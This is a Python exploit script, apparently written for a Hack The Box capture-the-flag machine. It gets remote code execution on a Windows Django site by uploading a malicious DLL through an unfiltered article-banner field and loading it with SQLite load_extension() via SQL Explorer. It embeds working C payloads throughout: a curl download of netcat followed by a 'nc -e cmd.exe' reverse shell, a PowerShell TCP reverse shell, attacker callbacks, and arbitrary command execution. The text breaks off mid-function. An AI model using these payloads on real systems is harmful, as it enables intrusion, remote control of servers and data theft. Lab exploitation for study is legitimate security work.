#!/usr/bin/env python3
"""
load_extension_rce.py - SQLite load_extension RCE Exploit
==========================================================

Exploits SQLite load_extension() via Django SQL Explorer to achieve RCE.

VULNERABILITY
-------------
SQLite's load_extension() function is enabled in Django SQL Explorer.
Combined with unrestricted file upload via article banners, this allows
loading malicious DLLs that execute arbitrary code on the Windows server.

ATTACK CHAIN
------------
1. Upload malicious DLL via article banner (no extension filtering)
2. DLL contains sqlite3_extension_init() entry point
3. Trigger via SQL: SELECT load_extension('C:\\path\\to\\evil.dll')
4. DLL code executes with web server privileges

PHASES
------
  Phase 1: PREREQ     - Verify prerequisites (cookies, mingw, connectivity)
  Phase 2: COMPILE    - Compile SQLite extension DLL
  Phase 3: UPLOAD     - Upload DLL via article banner
  Phase 4: TRIGGER    - Execute load_extension() via SQL Explorer
  Phase 5: VERIFY     - Confirm RCE via marker files or HTTP output

NOTE: Reverse shells are BLOCKED (ports 443, 4444 filtered outbound).
      Use --file-cmd for file-based command execution instead.

QUICK START
-----------
  python3 load_extension_rce.py --get-user-flag                  # Get user flag (end-to-end)
  python3 load_extension_rce.py --lhost 10.10.15.49              # Full chain (shell)
  python3 load_extension_rce.py --lhost 10.10.15.49 --confirm    # Interactive
  python3 load_extension_rce.py --lhost 10.10.15.49 --test-only  # Test RCE only
  python3 load_extension_rce.py --file-cmd "whoami /all"         # File-based RCE

INDIVIDUAL PHASES
-----------------
  python3 load_extension_rce.py --run-phase 1                    # Check prereqs
  python3 load_extension_rce.py --run-phase 2 --lhost 10.10.15.49  # Compile only
  python3 load_extension_rce.py --run-phase 3                    # Upload only
  python3 load_extension_rce.py --run-phase 4                    # Trigger only

OPTIONS
-------
  --get-user-flag  Retrieve user flag end-to-end (recommended for CTF)
  --run-phase N    Run only phase N (1-5). Uses saved state.
  --confirm        Ask for confirmation before each phase
  --test-only      Create test DLL (verifies RCE without shell)
  --force          Force recompile/reupload even if already done
  --shell-type     Shell type: nc (default) or powershell
  --phases         Show detailed phase information
  --file-cmd CMD   File-based RCE: run CMD, output to static/, read via HTTP
  --quick-dll      Quick DLL upload and trigger (convenience function)

FILES
-----
  tmp/admin_cookies.txt     Admin session (required, from lab_exploit.py)
  tmp/rce_state.json        Exploit state tracking
  tmp/rce_dll/              Compiled DLLs

PREREQUISITES
-------------
  - Admin cookies from OAuth CSRF exploit (run lab_exploit.py first)
  - mingw-w64 installed (apt install mingw-w64)
  - For shell: HTTP server serving nc64.exe, netcat listener

Author: Security Research
Target: Eloquia HTB (Windows Insane)
"""

import argparse
import hashlib
import json
import os
import random
import re
import string
import subprocess
import sys
import tempfile
import time
import requests
from datetime import datetime
from pathlib import Path

# =============================================================================
# CONFIGURATION
# =============================================================================

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TMP_DIR = os.path.join(SCRIPT_DIR, "tmp")
DLL_DIR = os.path.join(TMP_DIR, "rce_dll")
STATE_FILE = os.path.join(TMP_DIR, "rce_state.json")
COOKIES_FILE = os.path.join(TMP_DIR, "admin_cookies.txt")

# Target configuration
TARGET = "http://eloquia.htb"
TARGET_IP = "10.129.244.81"

# Paths on target
WEB_ROOT = r"C:\Web\Eloquia"
STATIC_PATH = r"C:\Web\Eloquia\static"
UPLOAD_PATH = r"C:\Web\Eloquia\static\assets\images\blog"

# DLL names
DLL_TEST = "rce_test.dll"
DLL_NC_SHELL = "rce_nc_shell.dll"
DLL_PS_SHELL = "rce_ps_shell.dll"

# Default ports
DEFAULT_CALLBACK_PORT = 8888
DEFAULT_SHELL_PORT = 4444

# =============================================================================
# ANSI COLORS FOR OUTPUT
# =============================================================================

class C:
    """ANSI color codes for terminal output"""
    R = '\033[91m'   # Red - errors
    G = '\033[92m'   # Green - success
    Y = '\033[93m'   # Yellow - warnings, waiting
    B = '\033[94m'   # Blue - section headers
    M = '\033[95m'   # Magenta - highlights
    C = '\033[96m'   # Cyan - info, data
    W = '\033[97m'   # White
    BOLD = '\033[1m'
    DIM = '\033[2m'
    X = '\033[0m'    # Reset

# =============================================================================
# OUTPUT HELPERS
# =============================================================================

def banner():
    """Display exploit banner"""
    print(f"""
{C.M}{C.BOLD}SQLITE LOAD_EXTENSION RCE EXPLOIT{C.X}
{C.M}{'='*50}{C.X}
  Target: eloquia.htb (Windows IIS)
  Vuln:   SQLite load_extension() enabled
  Vector: DLL upload via article banner
{C.M}{'='*50}{C.X}
""")

def section(title, description=""):
    """Print a section header"""
    print(f"\n{C.B}{C.BOLD}--- {title} ---{C.X}")
    if description:
        print(f"{C.DIM}    {description}{C.X}")

def step(num, total, msg):
    """Print a numbered step"""
    print(f"{C.Y}[{num}/{total}]{C.X} {msg}")

def success(msg):
    """Print success message"""
    print(f"{C.G}[+]{C.X} {msg}")

def error(msg):
    """Print error message"""
    print(f"{C.R}[-]{C.X} {msg}")

def info(msg):
    """Print info message"""
    print(f"{C.C}[*]{C.X} {msg}")

def warn(msg):
    """Print warning message"""
    print(f"{C.Y}[!]{C.X} {msg}")

def confirm(msg):
    """Ask for user confirmation, return True if yes"""
    try:
        response = input(f"{C.Y}[?]{C.X} {msg} [Y/n] ").strip().lower()
        return response in ('', 'y', 'yes')
    except (EOFError, KeyboardInterrupt):
        print()
        return False

def print_phase_help():
    """Print detailed help about phases"""
    print(f"""
{C.C}{C.BOLD}PHASE DETAILS{C.X}
{C.C}{'='*60}{C.X}

{C.Y}Phase 1: PREREQ{C.X}
  Verifies all prerequisites before exploitation:
  - Admin cookies exist and are valid
  - mingw-w64 compiler is installed
  - Target is reachable
  {C.DIM}Prerequisites: tmp/admin_cookies.txt (from lab_exploit.py)
  Creates: Nothing (validation only){C.X}

{C.Y}Phase 2: COMPILE{C.X}
  Compiles the SQLite extension DLL with payload:
  - Test DLL: Creates marker files + HTTP callback
  - Shell DLL: Downloads nc64.exe and connects back
  {C.DIM}Prerequisites: Phase 1, --lhost specified
  Creates: tmp/rce_dll/*.dll{C.X}

{C.Y}Phase 3: UPLOAD{C.X}
  Uploads the compiled DLL via article banner:
  - Creates new article with DLL as banner image
  - No extension filtering on this endpoint
  - File lands at: C:\\Web\\Eloquia\\static\\assets\\images\\blog\\
  {C.DIM}Prerequisites: Phase 2 (DLL compiled)
  Creates: Article with DLL on target{C.X}

{C.Y}Phase 4: TRIGGER{C.X}
  Executes load_extension() via SQL Explorer:
  - SELECT load_extension('C:\\\\path\\\\to\\\\dll')
  - SQLite loads DLL and calls sqlite3_extension_init()
  - Your payload executes with web server privileges
  {C.DIM}Prerequisites: Phase 3 (DLL uploaded)
  Creates: RCE on target{C.X}

{C.Y}Phase 5: VERIFY{C.X}
  Confirms successful code execution:
  - Checks for marker files (test mode)
  - Waits for reverse shell (shell mode)
  {C.DIM}Prerequisites: Phase 4 (triggered)
  Creates: Nothing (verification only){C.X}

{C.C}{'='*60}{C.X}
""")

# =============================================================================
# STATE MANAGEMENT
# =============================================================================

def load_state():
    """Load exploit state from file"""
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE) as f:
                return json.load(f)
        except:
            pass
    return {
        "compiled": {},      # DLL name -> compile timestamp
        "uploaded": {},      # DLL name -> article ID
        "triggered": {},     # DLL name -> trigger timestamp
        "verified": False,
        "lhost": None,
        "lport": None,
        "callback_port": None
    }

def save_state(state):
    """Save exploit state to file"""
    os.makedirs(TMP_DIR, exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2)

def ensure_dirs():
    """Create necessary directories"""
    os.makedirs(TMP_DIR, exist_ok=True)
    os.makedirs(DLL_DIR, exist_ok=True)

# =============================================================================
# DLL SOURCE TEMPLATES
# =============================================================================

# DLL templates now include {token} for verification
# Token is embedded in callback URL to confirm correct DLL executed

DLL_SOURCE_TEST = '''
#include <windows.h>

__declspec(dllexport) int sqlite3_extension_init(void *db, char **errmsg, void *api) {{
    // Create marker file to confirm execution
    WinExec("cmd.exe /c echo RCE_SUCCESS > {static_path}\\\\pwned.txt", 0);
    // HTTP callback with verification token
    WinExec("cmd.exe /c curl http://{lhost}:{callback_port}/rce_confirmed/{token}", 0);
    return 0;
}}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {{
    if (fdwReason == DLL_PROCESS_ATTACH) {{
        WinExec("cmd.exe /c echo DLL_LOADED > {static_path}\\\\dllmain.txt", 0);
    }}
    return TRUE;
}}
'''

DLL_SOURCE_NC = '''
#include <windows.h>

__declspec(dllexport) int sqlite3_extension_init(void *db, char **errmsg, void *api) {{
    // Verification callback first
    WinExec("cmd.exe /c curl http://{lhost}:{callback_port}/verified/{token}", 0);
    // Download netcat from attacker
    WinExec("cmd.exe /c curl http://{lhost}:{callback_port}/nc64.exe -o {static_path}\\\\nc.exe", 0);
    // Wait for download
    Sleep(3000);
    // Connect back with shell
    WinExec("cmd.exe /c {static_path}\\\\nc.exe {lhost} {lport} -e cmd.exe", 0);
    return 0;
}}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {{
    return TRUE;
}}
'''

DLL_SOURCE_PS = '''
#include <windows.h>

__declspec(dllexport) int sqlite3_extension_init(void *db, char **errmsg, void *api) {{
    // Verification callback
    WinExec("cmd.exe /c curl http://{lhost}:{callback_port}/verified/{token}", 0);
    WinExec("powershell -nop -w hidden -ep bypass -c \\"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\\"", 0);
    return 0;
}}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {{
    return TRUE;
}}
'''

# File-based command execution DLL (for when reverse shells are blocked)
DLL_SOURCE_FILE_CMD = '''
#include <windows.h>

__declspec(dllexport) int sqlite3_extension_init(void *db, char **errmsg, void *api) {{
    // Execute command and redirect output to static directory
    // Output readable via: http://eloquia.htb/static/{output_file}
    WinExec("cmd.exe /c {command} > {static_path}\\\\{output_file} 2>&1", 0);
    return 0;
}}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {{
    return TRUE;
}}
'''

DLL_FILE_CMD = "rce_filecmd.dll"

# =============================================================================
# EXPLOIT CLASS
# =============================================================================

class LoadExtensionExploit:
    """SQLite load_extension RCE exploit"""

    def __init__(self, lhost=None, lport=DEFAULT_SHELL_PORT,
                 callback_port=DEFAULT_CALLBACK_PORT, shell_type='nc',
                 test_only=False, force=False, interactive=False,
                 file_cmd=None, quick_dll=False):
        self.lhost = lhost
        self.lport = lport
        self.callback_port = callback_port
        self.shell_type = shell_type
        self.test_only = test_only
        self.force = force
        self.interactive = interactive
        self.file_cmd = file_cmd
        self.quick_dll = quick_dll

        self.session = requests.Session()
        self.state = load_state()

        # Update state with current config
        if lhost:
            self.state["lhost"] = lhost
        if lport:
            self.state["lport"] = lport
        if callback_port:
            self.state["callback_port"] = callback_port

    def get_dll_name(self):
        """Get appropriate DLL name based on mode"""
        if self.file_cmd:
            return DLL_FILE_CMD
        elif self.test_only:
            return DLL_TEST
        elif self.shell_type == 'nc':
            return DLL_NC_SHELL
        else:
            return DLL_PS_SHELL

    def get_dll_path(self):
        """Get local path to DLL"""
        return os.path.join(DLL_DIR, self.get_dll_name())

    def get_target_dll_path(self):
        """Get path to DLL on target"""
        return f"{UPLOAD_PATH}\\{self.get_dll_name()}"

    # =========================================================================
    # PHASE 1: PREREQUISITES
    # =========================================================================

    def phase_prereq(self):
        """
        Verify all prerequisites for exploitation.

        Checks:
        - Admin cookies file exists
        - Cookies are valid (can access admin panel)
        - mingw-w64 compiler installed
        - Target is reachable
        """
        section("PHASE 1: PREREQUISITES", "Verify requirements")

        step(1, 4, "Checking admin cookies...")
        if not os.path.exists(COOKIES_FILE):
            error(f"Cookies file not found: {COOKIES_FILE}")
            info("Run lab_exploit.py first to obtain admin cookies")
            return False

        # Load cookies
        with open(COOKIES_FILE) as f:
            for line in f:
                if '=' in line:
                    key, value = line.strip().split('=', 1)
                    self.session.cookies.set(key, value, domain='eloquia.htb')
        success(f"Loaded cookies from {COOKIES_FILE}")

        step(2, 4, "Validating admin session...")
        try:
            resp = self.session.get(f"{TARGET}/accounts/admin/", timeout=10)
            if 'Site administration' in resp.text:
                success("Admin session is valid")
            else:
                error("Cookies are invalid or expired")
                info("Re-run lab_exploit.py to get fresh cookies")
                return False
        except requests.RequestException as e:
            error(f"Connection failed: {e}")
            return False

        step(3, 4, "Checking mingw-w64 compiler...")
        result = subprocess.run(['which', 'x86_64-w64-mingw32-gcc'],
                               capture_output=True)
        if result.returncode == 0:
            success("mingw-w64 compiler found")
        else:
            error("mingw-w64 not installed")
            info("Install with: sudo apt install mingw-w64")
            return False

        step(4, 4, "Checking target connectivity...")
        try:
            resp = self.session.get(f"{TARGET}/", timeout=10)
            if resp.status_code == 200:
                success(f"Target reachable: {TARGET}")
            else:
                warn(f"Unexpected status: {resp.status_code}")
        except requests.RequestException as e:
            error(f"Target unreachable: {e}")
            return False

        return True

    # =========================================================================
    # PHASE 2: COMPILE
    # =========================================================================

    def _generate_token(self):
        """Generate a unique verification token"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

    def _calculate_hash(self, file_path):
        """Calculate SHA256 hash of a file"""
        sha256 = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                sha256.update(chunk)
        return sha256.hexdigest()

    def phase_compile(self):
        """
        Compile the SQLite extension DLL.

        Creates a Windows DLL with sqlite3_extension_init() entry point.
        The DLL payload depends on mode (test vs shell).
        Includes verification token for confirming correct DLL execution.
        """
        section("PHASE 2: COMPILE", "Build SQLite extension DLL")

        dll_name = self.get_dll_name()
        dll_path = self.get_dll_path()

        # Check if already compiled
        if not self.force and dll_name in self.state.get("compiled", {}):
            if os.path.exists(dll_path):
                existing_hash = self._calculate_hash(dll_path)
                existing_token = self.state.get("token", {}).get(dll_name, "unknown")
                info(f"DLL already compiled: {dll_name}")
                info(f"  Token: {existing_token}")
                info(f"  SHA256: {existing_hash[:16]}...")
                info("Use --force to recompile")
                return True

        # File-based command mode doesn't require lhost
        if not self.file_cmd and not self.lhost:
            error("--lhost is required for compilation (or use --file-cmd)")
            return False

        step(1, 4, "Generating verification token...")

        # Generate unique token for this compilation
        token = self._generate_token()
        output_file = f"output_{token}.txt"
        success(f"Token: {token}")

        if self.file_cmd:
            info(f"Output file: {output_file}")
            info(f"Read via: http://eloquia.htb/static/{output_file}")
        else:
            info("This token will be sent in callback to verify correct DLL executed")

        step(2, 4, f"Generating source for {dll_name}...")

        # Select source template
        if self.file_cmd:
            source = DLL_SOURCE_FILE_CMD
            # Escape the command for C string
            escaped_cmd = self.file_cmd.replace('\\', '\\\\').replace('"', '\\"')
        elif self.test_only:
            source = DLL_SOURCE_TEST
        elif self.shell_type == 'nc':
            source = DLL_SOURCE_NC
        else:
            source = DLL_SOURCE_PS

        # Format with parameters including token
        static_escaped = STATIC_PATH.replace('\\', '\\\\')

        if self.file_cmd:
            source = source.format(
                command=escaped_cmd,
                static_path=static_escaped,
                output_file=output_file
            )
            # Store output file for verification phase
            self.output_file = output_file
        else:
            source = source.format(
                lhost=self.lhost,
                lport=self.lport,
                callback_port=self.callback_port,
                static_path=static_escaped,
                token=token
            )

        success("Source generated with embedded token")

        step(3, 4, "Compiling with mingw-w64...")

        # Write source to temp file
        ensure_dirs()
        src_path = os.path.join(DLL_DIR, f"{dll_name}.c")
        with open(src_path, 'w') as f:
            f.write(source)

        # Compile
        result = subprocess.run(
            ['x86_64-w64-mingw32-gcc', '-shared', '-o', dll_path, src_path],
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            error(f"Compilation failed: {result.stderr}")
            return False

        # Calculate hash
        dll_hash = self._calculate_hash(dll_path)
        dll_size = os.path.getsize(dll_path)

        success(f"Compiled: {dll_path}")
        info(f"  Size: {dll_size} bytes")
        info(f"  SHA256: {dll_hash[:16]}...")

        step(4, 4, "Saving state with verification info...")

        # Save compile state with token and hash
        if "compiled" not in self.state:
            self.state["compiled"] = {}
        if "token" not in self.state:
            self.state["token"] = {}
        if "hash" not in self.state:
            self.state["hash"] = {}
        if "output_file" not in self.state:
            self.state["output_file"] = {}

        self.state["compiled"][dll_name] = datetime.now().isoformat()
        self.state["token"][dll_name] = token
        self.state["hash"][dll_name] = dll_hash
        if self.file_cmd:
            self.state["output_file"][dll_name] = output_file
        save_state(self.state)

        success("State saved")
        print()
        if self.file_cmd:
            print(f"{C.C}File-based command execution:{C.X}")
            print(f"  Command: {C.Y}{self.file_cmd}{C.X}")
            print(f"  Output:  {C.Y}http://eloquia.htb/static/{output_file}{C.X}")
        else:
            print(f"{C.C}Verification info for listener:{C.X}")
            print(f"  Expected token: {C.Y}{token}{C.X}")
            print(f"  Expected hash:  {C.Y}{dll_hash[:32]}...{C.X}")

        return True

    # =========================================================================
    # PHASE 3: UPLOAD
    # =========================================================================

    def _query_dll_in_database(self, dll_name):
        """
        Query database to check if DLL exists as article banner.
        Returns (article_id, banner_path) if found, (None, None) otherwise.

        Handles Django's duplicate filename behavior (rce_test.dll -> rce_test_abc123.dll)
        by using LIKE query and extracting actual path.
        """
        sql_url = f"{TARGET}/dev/sql-explorer/play/"
        sql_page = self.session.get(sql_url)
        csrf_match = re.search(r'csrfmiddlewaretoken.*?value="([^"]+)"', sql_page.text)

        if not csrf_match:
            return None, None

        csrf = csrf_match.group(1)

        # Extract base name without extension for LIKE query
        # rce_test.dll -> rce_test (matches rce_test.dll and rce_test_xyz.dll)
        base_name = dll_name.rsplit('.', 1)[0]

        # Query for articles with this DLL (or variant) as banner
        query = f"SELECT id, banner FROM Eloquia_article WHERE banner LIKE '%{base_name}%.dll' ORDER BY id DESC LIMIT 1"

        resp = self.session.post(sql_url, data={
            'csrfmiddlewaretoken': csrf,
            'sql': query,
            'connection': '1'
        })

        # Parse the HTML table response - extract actual banner path
        # Expected format: static/assets/images/blog/rce_test.dll (or rce_test_xyz123.dll)

        # Look for the banner path pattern
        banner_match = re.search(
            r'static/assets/images/blog/' + re.escape(base_name) + r'[^<"\']*\.dll',
            resp.text
        )

        if banner_match:
            actual_banner_path = banner_match.group(0)

            # Extract article ID from the response
            # Look for data-row with ID followed by this banner path
            row_match = re.search(
                r'<tr[^>]*>.*?<td[^>]*>(\d+)</td>.*?' + re.escape(actual_banner_path),
                resp.text,
                re.DOTALL
            )
            if row_match:
                return row_match.group(1), actual_banner_path

            # Fallback: just get the most recent ID
            id_match = re.search(r'<td[^>]*>(\d+)</td>', resp.text)
            if id_match:
                return id_match.group(1), actual_banner_path

        return None, None

    def phase_upload(self):
        """
        Upload the DLL via article banner.

        The article creation endpoint allows any file extension for banners.
        Files are saved to: C:\\Web\\Eloquia\\static\\assets\\images\\blog\\
        """
        section("PHASE 3: UPLOAD", "Upload DLL via article banner")

        dll_name = self.get_dll_name()
        dll_path = self.get_dll_path()
        expected_banner = f"static/assets/images/blog/{dll_name}"

        # Check if local DLL exists
        if not os.path.exists(dll_path):
            error(f"DLL not found: {dll_path}")
            info("Run phase 2 first to compile the DLL")
            return False

        step(1, 4, "Checking if DLL needs to be uploaded...")

        # Check if we need to upload:
        # 1. DLL doesn't exist on target -> upload
        # 2. DLL exists but local was recompiled since last upload -> upload
        # 3. DLL exists and is current -> skip (unless --force)

        existing_id, existing_path = self._query_dll_in_database(dll_name)
        needs_upload = False
        reason = ""

        if not existing_id:
            needs_upload = True
            reason = "DLL not found on target"
        else:
            # DLL exists on target - check if local is newer
            local_compile_time = self.state.get("compiled", {}).get(dll_name)
            last_upload_time = self.state.get("upload_time", {}).get(dll_name)

            if local_compile_time and last_upload_time:
                # Compare timestamps
                if local_compile_time > last_upload_time:
                    needs_upload = True
                    reason = "Local DLL was recompiled since last upload"
                    warn(f"DLL on target is stale (compiled: {local_compile_time[:19]})")
                    warn(f"                       (uploaded: {last_upload_time[:19]})")
            elif local_compile_time and not last_upload_time:
                # Compiled but no upload record - might be from different session
                needs_upload = True
                reason = "No upload timestamp recorded for this DLL"

        if not needs_upload and not self.force:
            success(f"DLL already exists on target and is current!")
            info(f"  Article ID: {existing_id}")
            info(f"  Banner path: {existing_path}")
            info("Use --force to re-upload anyway")

            # Update state
            self.state["uploaded"][dll_name] = existing_id
            save_state(self.state)
            return True

        if self.force:
            reason = "--force specified"

        info(f"Will upload: {reason}")

        step(2, 4, "Getting CSRF token...")

        # Get admin article creation page
        url = f"{TARGET}/accounts/admin/Eloquia/article/add/"
        resp = self.session.get(url)

        csrf_match = re.search(r'csrfmiddlewaretoken.*?value="([^"]+)"', resp.text)
        if not csrf_match:
            error("Could not get CSRF token")
            return False

        csrf_token = csrf_match.group(1)
        success(f"Got CSRF token: {csrf_token[:20]}...")

        step(3, 4, f"Uploading {dll_name}...")

        timestamp = int(time.time())
        with open(dll_path, 'rb') as f:
            files = {
                'banner': (dll_name, f, 'application/octet-stream')
            }
            data = {
                'csrfmiddlewaretoken': csrf_token,
                'title': f'RCE_{timestamp}',
                'content': 'Exploit payload',
                'author': '1',
                'reported': '0',
                '_save': 'Save'
            }

            resp = self.session.post(url, data=data, files=files,
                                    allow_redirects=False)

        if resp.status_code not in [200, 302]:
            error(f"Upload failed: HTTP {resp.status_code}")
            return False

        success(f"Upload request completed (HTTP {resp.status_code})")

        step(4, 4, "Verifying upload in database...")

        # Query database to confirm the DLL was actually saved
        article_id, banner_path = self._query_dll_in_database(dll_name)

        if article_id and banner_path:
            success(f"Verified: DLL exists in database!")
            info(f"  Article ID: {article_id}")
            info(f"  Banner path: {banner_path}")
            info(f"  Target filesystem: {self.get_target_dll_path()}")

            # Save state with upload timestamp and actual banner path
            self.state["uploaded"][dll_name] = article_id
            if "upload_time" not in self.state:
                self.state["upload_time"] = {}
            self.state["upload_time"][dll_name] = datetime.now().isoformat()
            # Store actual banner path (Django may have added suffix for duplicates)
            if "banner_path" not in self.state:
                self.state["banner_path"] = {}
            self.state["banner_path"][dll_name] = banner_path
            save_state(self.state)
            return True
        else:
            error("Upload verification FAILED!")
            error(f"Could not find '{expected_banner}' in database")
            info("The upload may have been rejected or saved with different name")
            return False

    # =========================================================================
    # PHASE 4: TRIGGER
    # =========================================================================

    def _get_actual_target_path(self, dll_name):
        """
        Get the actual filesystem path for the DLL on target.
        Uses saved banner_path from state if available (handles Django suffixes).
        """
        # Check if we have the actual path from a previous upload
        banner_path = self.state.get("banner_path", {}).get(dll_name)

        if banner_path:
            # Convert web path to filesystem path
            # static/assets/images/blog/rce_test.dll -> C:\Web\Eloquia\static\assets\images\blog\rce_test.dll
            return f"{WEB_ROOT}\\{banner_path.replace('/', '\\')}"
        else:
            # Fallback to assumed path
            return self.get_target_dll_path()

    def phase_trigger(self):
        """
        Execute load_extension() via SQL Explorer.

        Constructs and executes:
        SELECT load_extension('C:\\Web\\Eloquia\\static\\assets\\images\\blog\\evil.dll')
        """
        section("PHASE 4: TRIGGER", "Execute load_extension()")

        dll_name = self.get_dll_name()

        # Get actual target path (may differ if Django added suffix)
        target_path = self._get_actual_target_path(dll_name)
        dll_path_escaped = target_path.replace('\\', '\\\\')

        # Show which path we're using
        if self.state.get("banner_path", {}).get(dll_name):
            info(f"Using actual path from database")
        else:
            warn(f"Using assumed path (no upload state found)")
        info(f"Target: {target_path}")

        # Check if already triggered recently (within 5 min)
        if not self.force and dll_name in self.state.get("triggered", {}):
            last_trigger = self.state["triggered"][dll_name]
            info(f"DLL was triggered at: {last_trigger}")
            if not self.interactive:
                warn("Use --force to re-trigger")

        step(1, 2, "Getting CSRF token...")

        sql_url = f"{TARGET}/dev/sql-explorer/play/"
        resp = self.session.get(sql_url)

        csrf_match = re.search(r'csrfmiddlewaretoken.*?value="([^"]+)"', resp.text)
        if not csrf_match:
            error("Could not get CSRF token")
            return False

        csrf_token = csrf_match.group(1)
        success(f"Got CSRF token: {csrf_token[:20]}...")

        # Construct SQL
        sql = f"SELECT load_extension('{dll_path_escaped}')"

        step(2, 2, "Executing load_extension()...")
        info(f"SQL: {sql}")

        if self.interactive:
            if not confirm("Execute load_extension now?"):
                warn("Aborted by user")
                return False

        resp = self.session.post(sql_url, data={
            'csrfmiddlewaretoken': csrf_token,
            'sql': sql,
            'connection': '1'
        })

        # Check for errors
        if 'db-error' in resp.text:
            error_match = re.search(r'<div[^>]*db-error[^>]*>([^<]+)', resp.text)
            if error_match:
                error_msg = error_match.group(1).strip()
                if 'module could not be found' in error_msg.lower():
                    error(f"DLL not found on target")
                    info("Ensure phase 3 (upload) completed successfully")
                elif 'procedure could not be found' in error_msg.lower():
                    error("DLL found but sqlite3_extension_init missing")
                    info("Check DLL compilation")
                else:
                    error(f"SQL Error: {error_msg}")
                return False

        success("load_extension() executed!")
        info("DLL's sqlite3_extension_init() should have run")

        # Save state
        self.state["triggered"][dll_name] = datetime.now().isoformat()
        save_state(self.state)

        return True

    # =========================================================================
    # PHASE 5: VERIFY
    # =========================================================================

    def phase_verify(self):
        """
        Verify successful code execution.

        For file-cmd mode: Check output file at http://eloquia.htb/static/{filename}.txt
        For test mode: Check marker files
        For shell mode: Remind user to check listener
        """
        section("PHASE 5: VERIFY", "Confirm code execution")

        if self.file_cmd:
            # File-based command execution verification
            dll_name = self.get_dll_name()
            output_file = self.state.get("output_file", {}).get(dll_name)

            if not output_file:
                # Try to get from instance variable if just compiled
                output_file = getattr(self, 'output_file', None)

            if not output_file:
                error("Output file not found in state")
                info("Re-run with --force to recompile")
                return False

            output_url = f"{TARGET}/static/{output_file}"

            step(1, 2, f"Checking for output at {output_url}...")

            # Wait a moment for command to complete
            time.sleep(2)

            try:
                resp = self.session.get(output_url, timeout=10)
                if resp.status_code == 200:
                    success(f"Output file found!")
                    output_text = resp.text.strip()

                    # Check if output looks like a flag (32-char hex string)
                    flag_match = re.search(r'\b([a-f0-9]{32})\b', output_text)

                    if flag_match:
                        flag = flag_match.group(1)
                        print()
                        print(f"{C.G}{'='*60}{C.X}")
                        print(f"{C.G}{C.BOLD}  USER FLAG{C.X}")
                        print(f"{C.G}{'='*60}{C.X}")
                        print()
                        print(f"  {C.G}{C.BOLD}{flag}{C.X}")
                        print()
                        print(f"{C.G}{'='*60}{C.X}")

                        # Save flag to dedicated file
                        flag_file = os.path.join(TMP_DIR, "user_flag.txt")
                        with open(flag_file, 'w') as f:
                            f.write(flag + '\n')
                        success(f"Flag saved to: {flag_file}")

                        self.state["user_flag"] = flag
                    else:
                        # Regular command output
                        print()
                        print(f"{C.C}{'='*60}{C.X}")
                        print(f"{C.C}Command Output:{C.X}")
                        print(f"{C.C}{'='*60}{C.X}")
                        print(output_text)
                        print(f"{C.C}{'='*60}{C.X}")

                    step(2, 2, "Saving output...")
                    # Save output locally
                    output_local = os.path.join(TMP_DIR, f"cmd_output_{output_file}")
                    with open(output_local, 'w') as f:
                        f.write(resp.text)
                    success(f"Output saved to: {output_local}")

                    self.state["verified"] = True
                    save_state(self.state)
                    return True
                else:
                    warn(f"Output file not found (HTTP {resp.status_code})")
                    info("Command may still be executing, try again in a few seconds")
                    info(f"Manual check: curl {output_url}")
                    return False
            except requests.RequestException as e:
                error(f"Failed to fetch output: {e}")
                return False

        elif self.test_only:
            step(1, 2, "Checking for marker files...")

            markers = {
                f"{TARGET}/static/pwned.txt": "sqlite3_extension_init executed",
                f"{TARGET}/static/dllmain.txt": "DllMain executed"
            }

            found = False
            for url, description in markers.items():
                try:
                    resp = self.session.head(url, timeout=5)
                    if resp.status_code == 200:
                        success(f"Found: {url}")
                        info(f"  -> {description}")
                        found = True
                    else:
                        warn(f"Not found: {url}")
                except requests.RequestException:
                    warn(f"Request failed: {url}")

            step(2, 2, "Checking HTTP callback...")
            info(f"Check your HTTP server on port {self.callback_port}")
            info("Look for: GET /rce_confirmed")

            if found:
                print()
                print(f"{C.G}{C.BOLD}  RCE VERIFIED!{C.X}")
                self.state["verified"] = True
                save_state(self.state)
                return True
            else:
                warn("Marker files not found - check HTTP callback")
                return True  # Don't fail, might just need callback check

        else:
            step(1, 1, "Shell mode - check your listeners")
            print()
            print(f"{C.Y}NOTE: Reverse shells may be BLOCKED!{C.X}")
            print(f"  Outbound ports 443, 4444 are filtered on this target.")
            print(f"  Consider using --file-cmd for file-based execution instead.")
            print()
            print(f"{C.Y}If using netcat shell:{C.X}")
            print(f"  1. Ensure HTTP server on port {self.callback_port} is serving nc64.exe")
            print(f"  2. Check netcat listener on port {self.lport}")
            print()
            print(f"{C.Y}If using PowerShell shell:{C.X}")
            print(f"  Check netcat listener on port {self.lport}")
            print()

            if self.interactive:
                if confirm("Did you receive a shell?"):
                    success("Exploitation successful!")
                    self.state["verified"] = True
                    save_state(self.state)
                    return True
                else:
                    warn("Shell not received - may need to re-trigger")
                    return False

            return True

    # =========================================================================
    # RUN METHODS
    # =========================================================================

    def run_phase(self, phase_num):
        """Run a single phase"""
        phases = {
            1: ("PREREQ", self.phase_prereq),
            2: ("COMPILE", self.phase_compile),
            3: ("UPLOAD", self.phase_upload),
            4: ("TRIGGER", self.phase_trigger),
            5: ("VERIFY", self.phase_verify)
        }

        if phase_num not in phases:
            error(f"Unknown phase: {phase_num}")
            return False

        name, func = phases[phase_num]
        print(f"\n{C.C}{C.BOLD}Running Phase {phase_num}: {name}{C.X}\n")

        return func()

    def run_all(self):
        """Run all phases"""
        phases = [
            (1, "PREREQ", self.phase_prereq),
            (2, "COMPILE", self.phase_compile),
